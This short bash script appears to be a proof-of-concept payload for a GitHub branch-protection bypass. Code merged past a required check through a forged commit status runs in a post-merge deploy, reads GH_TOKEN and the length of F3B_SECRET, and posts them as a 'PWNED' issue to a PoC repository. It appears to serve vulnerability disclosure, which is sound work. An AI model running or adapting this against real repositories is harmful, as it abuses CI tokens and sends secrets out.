#!/bin/bash
set -e
PRES=$([ -n "$GH_TOKEN" ] && echo true || echo false)
BODY="Code merged to protected f3b-main PAST the app-bound required check ci-gate (GitHub held the PR blocked); the check was satisfied ONLY by a write-collaborator FORGED commit status. Executing in post-merge deploy. write-scoped-token-present=$PRES; F3B_SECRET-length=${#F3B_SECRET}"
curl -s -X POST -H "Authorization: token $GH_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/mergify-poc-gng/poc-repo/issues" -d "$(printf '{"title":"F3B-PWNED forged-check RCE on protected branch","body":"%s"}' "$BODY")"